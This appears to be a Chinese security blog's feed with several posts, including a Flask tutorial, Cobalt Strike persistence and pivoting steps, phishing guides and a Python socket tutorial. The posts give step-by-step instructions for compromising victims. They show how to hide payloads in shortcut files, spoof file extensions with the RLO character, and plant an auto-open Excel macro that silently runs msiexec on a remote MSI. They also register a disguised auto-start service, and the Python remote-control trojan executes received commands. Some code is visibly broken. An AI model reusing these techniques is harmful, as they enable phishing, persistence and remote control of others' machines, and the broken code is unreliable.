title="十三、session"></a>十三、session</h1><p>session是<strong>服务器为了保存用户状态而创建的一个特殊的对象</strong></p><p>用flask设置session首先得配置加密字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> session</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置加密字符串</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;key123&quot;</span></span><br><span class="line">app.config[<span class="string">&#x27;PERNAMENT_SESSION&#x27;</span>] = timedelta(hours=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>接着继续设置session的存储</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置session</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/slogin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slogin</span>():</span><br><span class="line">    session[<span class="string">&#x27;u_id&#x27;</span>]=<span class="string">&quot;2&quot;</span></span><br><span class="line">    session[<span class="string">&#x27;vip&#x27;</span>]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;登入&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/sget&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sget</span>():</span><br><span class="line">    <span class="comment">#读取session</span></span><br><span class="line">    u_id = session[<span class="string">&#x27;u_id&#x27;</span>]</span><br><span class="line">    vip = session[<span class="string">&#x27;vip&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;cookie_test.html&#x27;</span>,uid=u_id,vip=vip)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除session</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/slogout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slogout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;u_id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;vip&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="comment">#其他删除方法</span></span><br><span class="line">    <span class="comment">#session[&#x27;u_id&#x27;]=False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#全部删除</span></span><br><span class="line">    <span class="comment">#session.clear()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;登出&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><strong>几种session的删除方法：</strong></p><ol><li><p>session.pop(‘—‘, None)</p></li><li><p>session[‘—‘] &#x3D; False</p></li><li><p>session.clear()     #删除全部session</p></li></ol><h1 id="十四、表单处理"><a href="#十四、表单处理" class="headerlink" title="十四、表单处理"></a>十四、表单处理</h1><p><strong>前端</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/chuli&quot;</span>&gt;</span></span><br><span class="line">  用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uname&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2023/12/16/flask/1686031732174-cb202d0a-d4e3-4588-8cad-e50205f767d9.png" class><p><strong>后端</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#表单测试</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test1&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;biaodan_test.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/chuli&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chuli</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&quot;uname&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;passwd&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用户名提交了&quot;</span>+username+<span class="string">&quot;密码提交了&quot;</span>+password)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;chuli.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><em>关键语句：</em></p><p>在路径后加上——methods&#x3D;[‘POST’]</p><p>获取表单中的数据——request.form.get(“<em>passwd</em>“)，</p><p>参数对应前端代码中name的值密码：<code>&lt;input type=&quot;password&quot; name=&quot;*passwd*&quot;/&gt;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cs-权限维持</title>
    <link href="/2023/12/03/cs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <url>/2023/12/03/cs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<p>肉鸡上线后很容易掉线，因此需要再放入一个payload，借用window的注册表或者计划任务进行权限维持</p><span id="more"></span><h3 id="1"><a href="#1" class="headerlink" title="#1"></a>#1</h3><p>新建一个payload，<strong>Attack—Packages—Windows Executable（S）</strong></p><img src="/2023/12/03/cs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/1701607487545-18ed9580-ae77-4c66-8722-1768ac3089f4.png" class><p>选择<strong>Windows Service EXE</strong></p><img src="/2023/12/03/cs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/1701607549098-ac9ff62f-f78d-4ec8-acaf-22df796971e3.png" class><p>在桌面上生成好了一个payload</p><img src="/2023/12/03/cs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/1701607592697-2320a817-2f47-4f56-b66d-62e56626c42c.png" class><h3 id="2"><a href="#2" class="headerlink" title="#2"></a>#2</h3><p>右键肉鸡interact</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:\windows\temp  </span><br><span class="line">upload /home/kali/Desktop/b.exe</span><br><span class="line"><span class="comment">#上传payload</span></span><br><span class="line">shell <span class="built_in">sc</span> create <span class="string">&quot;thisserver&quot;</span>binpath=<span class="string">&quot;c:\windows\temp\b.exe&quot;</span></span><br><span class="line"><span class="comment">#创建一个关联payload的服务</span></span><br><span class="line">shell <span class="built_in">sc</span> description <span class="string">&quot;thisserver&quot;</span> <span class="string">&quot;zhe shi fu wu&quot;</span></span><br><span class="line"><span class="comment">#对刚生成的服务进行伪装</span></span><br><span class="line">shell <span class="built_in">sc</span> config <span class="string">&quot;thisserver&quot;</span> <span class="built_in">start</span>=auto</span><br><span class="line"><span class="comment">#让服务变为自动启动</span></span><br><span class="line">shell net <span class="built_in">start</span> <span class="string">&quot;thisserver&quot;</span></span><br><span class="line"><span class="comment">#启动服务</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
      <tag>Cobalt Strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>钓鱼攻击</title>
    <link href="/2023/12/03/%E9%92%93%E9%B1%BC/"/>
    <url>/2023/12/03/%E9%92%93%E9%B1%BC/</url>
    
    <content type="html"><![CDATA[<p>一种应用较为广泛的一种攻击方式</p><span id="more"></span><h2 id="lnk快捷方式"><a href="#lnk快捷方式" class="headerlink" title="lnk快捷方式"></a>lnk快捷方式</h2><h4 id="1、新建一个快捷方式"><a href="#1、新建一个快捷方式" class="headerlink" title="1、新建一个快捷方式"></a>1、新建一个快捷方式</h4><p>位置输入<strong>C:\Windows\System32\WindowsPowerShell\v1.0\</strong></p><p>（powershell的所在位置的文件目录）</p><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701588740139-7c579bd4-24af-454a-8490-cb706f576bee.png" class><p>\n</p><p>后面再加上cs生成的payload</p><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701589028383-2ab06853-be9b-44e8-aa70-bd7503369096.png" class><h4 id="2、取一个方便操作的名字"><a href="#2、取一个方便操作的名字" class="headerlink" title="2、取一个方便操作的名字"></a>2、取一个方便操作的名字</h4><h4 id="3、更改图标"><a href="#3、更改图标" class="headerlink" title="3、更改图标"></a>3、更改图标</h4><p>右键属性——更改图标——在  <strong>%SystemRoot%\System32\shell32.dll</strong>  这个位置下可以找到许多的系统图标</p><p>依旧选择一个方便操作的</p><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701589210955-6b57866e-f8bd-4522-bf15-a16948df69be.png" class><p>被点击后即可上线</p><h2 id="unicode字符伪装"><a href="#unicode字符伪装" class="headerlink" title="unicode字符伪装"></a>unicode字符伪装</h2><blockquote><p>用于伪装exe文件，降低在人眼中的敏感度</p></blockquote><p>例如这有一个 hh.exe</p><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701590650771-dc838db1-57a3-4df0-82eb-063d480fef1e.png" class><p>添加一个正常常见的格式后缀如 .mp3</p><p>haha.exe.mp3</p><p>将后缀反写后复制 <strong>3pm.exe</strong></p><p>删掉后缀——右键 <strong>插入Unicode控制字符</strong>——选择<strong>RLO</strong>——复制3pm.exe</p><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701590795268-58ba31ee-9ee4-49a4-9a1a-48511403c5ad.png" class><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701590774948-d8e0ed95-fbc1-44fd-bd4d-298b722db9cc.png" class><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701590725916-fdff831f-00d6-4bee-bc65-26a60ab49c8b.png" class><p>后缀看上去是mp3，其实还是exe格式的文件</p><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701590733630-6468c17d-0736-4c74-a615-7632caeba062.png" class><p>诱导点击即可上线</p><h2 id="Excel"><a href="#Excel" class="headerlink" title="Excel"></a>Excel</h2><h4 id="1、打开excel，右键sheet选择插入宏表"><a href="#1、打开excel，右键sheet选择插入宏表" class="headerlink" title="1、打开excel，右键sheet选择插入宏表"></a>1、打开excel，右键sheet选择插入宏表</h4><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701592127177-278a241c-5426-434f-8bf2-911b89f9a23c.png" class><h4 id="2、在A1输入-EXEC-“msiexec-q-i-http-xxx-xxx-xxx-xxx-name-msi-，后面为你在msf生成的payload"><a href="#2、在A1输入-EXEC-“msiexec-q-i-http-xxx-xxx-xxx-xxx-name-msi-，后面为你在msf生成的payload" class="headerlink" title="2、在A1输入**&#x3D;EXEC(“msiexec&#x2F;q &#x2F;i http://xxx.xxx.xxx.xxx/name.msi&quot;)**，后面为你在msf生成的payload"></a>2、在A1输入**&#x3D;EXEC(“msiexec&#x2F;q &#x2F;i <a href="http://xxx.xxx.xxx.xxx/name.msi%22)**%EF%BC%8C%E5%90%8E%E9%9D%A2%E4%B8%BA%E4%BD%A0%E5%9C%A8msf%E7%94%9F%E6%88%90%E7%9A%84payload">http://xxx.xxx.xxx.xxx/name.msi&quot;)**，后面为你在msf生成的payload</a></h4><p>A2输入**&#x3D;HALT()** </p><p>选择整个A列，将头名改为 <strong>Aotu_open</strong>，回车保存</p><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701592175831-d977784f-b1c2-4837-8b76-34fe9b1156c9.png" class><h4 id="3、最后右键将宏隐藏，保存为启用宏的文件"><a href="#3、最后右键将宏隐藏，保存为启用宏的文件" class="headerlink" title="3、最后右键将宏隐藏，保存为启用宏的文件"></a>3、最后右键将宏隐藏，保存为启用宏的文件</h4><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701593215024-6b56fc6a-a829-4b5f-b6eb-42300da93af0.png" class="%1701592821943-9096cdc9-7688-4539-8801-4a4c8347a307.png } 诱导用户启用宏即可上线 ## Word #### 1、创建一个word文档，打开视图中选择宏 {% asset_img"><h4 id="2、创建一个宏"><a href="#2、创建一个宏" class="headerlink" title="2、创建一个宏"></a>2、创建一个宏</h4><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701593170730-4e8ccdd5-bb13-4beb-9172-a31751fc7fea.png" class><h4 id="3、在ThisDocument中复制cs生成的payload"><a href="#3、在ThisDocument中复制cs生成的payload" class="headerlink" title="3、在ThisDocument中复制cs生成的payload"></a>3、在ThisDocument中复制cs生成的payload</h4><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701593260546-7b8393a3-4aca-4648-b3a9-4dbd26839cf9.png" class><img src="/2023/12/03/%E9%92%93%E9%B1%BC/1701594148508-97fd1b62-73c6-4510-acd7-bd13b751ccdb.png" class><h4 id="4、最后保存为启用宏的文件"><a href="#4、最后保存为启用宏的文件" class="headerlink" title="4、最后保存为启用宏的文件"></a>4、最后保存为启用宏的文件</h4>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cs--多层链接</title>
    <link href="/2023/12/03/cs%E5%A4%9A%E5%B1%82%E9%93%BE%E6%8E%A5/"/>
    <url>/2023/12/03/cs%E5%A4%9A%E5%B1%82%E9%93%BE%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<p>hacker（外网）——sesrver1（内网）——server2（内网）</p><p>通过同一内网的一个服务器作为跳板对另一个服务器进行控制（大概</p><span id="more"></span><h2 id="多层正向链接"><a href="#多层正向链接" class="headerlink" title="多层正向链接"></a>多层正向链接</h2><h4 id="1"><a href="#1" class="headerlink" title="#1"></a>#1</h4><p>新建一个listener，选择<strong>Beacon TCP</strong></p><img src="/2023/12/03/cs%E5%A4%9A%E5%B1%82%E9%93%BE%E6%8E%A5/1701609069408-b6788a9e-02cd-4147-a85a-f6c7979e964a.png" class><h4 id="2"><a href="#2" class="headerlink" title="#2"></a>#2</h4><p>在这个listener上创建一个payload</p><p><strong>Attack—Packages—Windows Executable（S）</strong>，选择<strong>Windows Service EXE</strong></p><img src="/2023/12/03/cs%E5%A4%9A%E5%B1%82%E9%93%BE%E6%8E%A5/1701609328786-0c886cad-f40f-4d71-9795-5a16271b6003.png" class><h4 id="3"><a href="#3" class="headerlink" title="#3"></a>#3</h4><p>在server2执行payload却没有上线？不急</p><p>右键server1（已上线的一号肉鸡）interact</p><p>命令行 <strong>connect [server2 ip]</strong></p><p>敲完直接上线，server2上会有一个想链条一样的标志</p><img src="/2023/12/03/cs%E5%A4%9A%E5%B1%82%E9%93%BE%E6%8E%A5/1701609689143-1575810a-b398-4592-9b4c-dbc88fc987fe.png" class><h2 id="多层反向链接"><a href="#多层反向链接" class="headerlink" title="多层反向链接"></a>多层反向链接</h2><p>右键server1，<strong>Pivoting—Listener</strong></p><img src="/2023/12/03/cs%E5%A4%9A%E5%B1%82%E9%93%BE%E6%8E%A5/1701610205104-88555f95-2748-4f1e-af34-47cf07b43fa2.png" class><p>在这个Listener下创建一个同上的payload，server2运行即可直接上线</p>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
      <tag>Cobalt Strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简易控制程序</title>
    <link href="/2023/12/02/%E7%AE%80%E6%98%93%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F/"/>
    <url>/2023/12/02/%E7%AE%80%E6%98%93%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<p>cndm</p><span id="more"></span><h3 id="其分为两个端；"><a href="#其分为两个端；" class="headerlink" title="其分为两个端；"></a>其分为两个端；</h3><p>一是&lt;服务端&gt;muma控制端—server</p><p>二是&lt;客户端&gt;haker控制端—client</p><h3 id="1、socket"><a href="#1、socket" class="headerlink" title="1、socket"></a>1、socket</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#使用socket的tcp通信</span></span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    host = socket.gethostname()  <span class="comment">#获取本机地址</span></span><br><span class="line">    port = <span class="number">8899</span> <span class="comment">#任意开放端口</span></span><br><span class="line">    s.bind((host,port)) <span class="comment">#绑定</span></span><br><span class="line">    s.listen(<span class="number">100</span>) <span class="comment">#允许的连接数</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c,addr = s.accept()<span class="comment">#c：客户机   s：服务机</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;连接地址&quot;</span>,addr)</span><br><span class="line">    c.send(<span class="string">&quot;welcome&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#接收并转码数据</span></span><br><span class="line">            recv_data = c.recv(<span class="number">1024</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(recv_data)</span><br><span class="line">            <span class="keyword">if</span> recv_data == <span class="string">&#x27;cmd&#x27;</span>:</span><br><span class="line">                c.send(<span class="string">&quot;cmd ready&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    data = c.recv(<span class="number">1024</span>)</span><br><span class="line">                    recv_data2 = data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> recv_data2 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">                        c.send(<span class="string">&quot;cmd close&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        x = os.popen(recv_data2).read()</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> x:</span><br><span class="line">                            c.send(<span class="string">&quot;invalid command&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            c.send(x.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            </span><br><span class="line"><span class="keyword">elif</span> <span class="keyword">not</span> recv_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在断开&quot;</span>)</span><br><span class="line">                c.send(<span class="string">&quot;正在断开&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))、</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c.send(recv_data.encode(<span class="string">&quot;utf-8&quot;</span>)) <span class="comment">#对输入信息的回传</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;断开连接&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="2：client"><a href="#2：client" class="headerlink" title="2：client"></a>2：client</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  <span class="comment">#与服务端同理</span></span><br><span class="line">host = <span class="string">&#x27;-----------&#x27;</span>  <span class="comment">#目标机ip</span></span><br><span class="line">port = <span class="number">8899</span> </span><br><span class="line">s.connect((host,port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data_recv = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(data_recv.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">msg = <span class="built_in">input</span>(<span class="string">&quot;send message-&gt;&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> msg:</span><br><span class="line">s.send(<span class="string">&quot;empty&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">elif</span> msg == <span class="string">&quot;stop&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;程序已挺止“）</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">s.send(msg.encode(&quot;</span>utf-<span class="number">8</span><span class="string">&quot;))</span></span><br><span class="line"><span class="string">s.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="string">main()</span></span><br></pre></td></tr></table></figure><hr><h3 id="主要功能："><a href="#主要功能：" class="headerlink" title="主要功能："></a>主要功能：</h3><p>实现简易的主客机socket通信，简易木马对目标机cmd命令的控制</p><h3 id="关键知识："><a href="#关键知识：" class="headerlink" title="关键知识："></a>关键知识：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用socket的tcp通信</span></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#绑定ip与端口</span></span><br><span class="line">s.bind((host,port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#客户机连接</span></span><br><span class="line">c.connect((host,port))</span><br><span class="line"><span class="comment">#服务机接收</span></span><br><span class="line">c.addr = s.accept()</span><br><span class="line"></span><br><span class="line"><span class="comment">#服务机接收数据</span></span><br><span class="line">recv_data = c.recv(<span class="number">1024</span><span class="comment">#数据大小).decode(&quot;utf-8&quot;) #数据转码 </span></span><br><span class="line">                   <span class="comment">#发送转码--encode</span></span><br><span class="line">                   <span class="comment">#接收转码--decode</span></span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line">s.send(data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#os下的cmd命令操作</span></span><br><span class="line">os.popen(data)</span><br></pre></td></tr></table></figure><hr><details class="lake-collapse"><summary id="ucf9fee61"><span class="ne-text">关于python的socket详解见CSDN--《</span><span class="ne-text" style="color: rgb(34, 34, 38)">Python socket详解》</span></summary></details>]]></content>
    
    
    
    <tags>
      
      <tag>实践应用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python网络编程</title>
    <link href="/2023/12/02/python_socket/"/>
    <url>/2023/12/02/python_socket/</url>
    
    <content type="html"><![CDATA[<p>python中socket相关的通信编写</p><span id="more"></span><!--more--><h2 id="什么是-Socket"><a href="#什么是-Socket" class="headerlink" title="什么是 Socket?"></a>什么是 Socket?</h2><p>Socket又称”套接字”，应用程序通常通过”套接字”向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。</p><h2 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a>socket()函数</h2><p>Python 中，我们用 socket（）函数来创建套接字，语法格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket([family[, <span class="built_in">type</span>[, proto]]])</span><br></pre></td></tr></table></figure><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li>family: 套接字家族可以使 AF_UNIX 或者 AF_INET。</li><li>type: 套接字类型可以根据是面向连接的还是非连接分为 SOCK_STREAM 或 SOCK_DGRAM。</li><li>protocol: 一般不填默认为 0。</li></ul><h2 id="Python-Internet-模块"><a href="#Python-Internet-模块" class="headerlink" title="Python Internet 模块"></a>Python Internet 模块</h2><p>以下列出了 Python 网络编程的一些重要模块：</p><table><thead><tr><th>协议</th><th>功能用处</th><th>端口号</th><th>Python 模块</th></tr></thead><tbody><tr><td>HTTP</td><td>网页访问</td><td>80</td><td>httplib, urllib, xmlrpclib</td></tr><tr><td>NNTP</td><td>阅读和张贴新闻文章，俗称为”帖子”</td><td>119</td><td>nntplib</td></tr><tr><td>FTP</td><td>文件传输</td><td>20</td><td>ftplib, 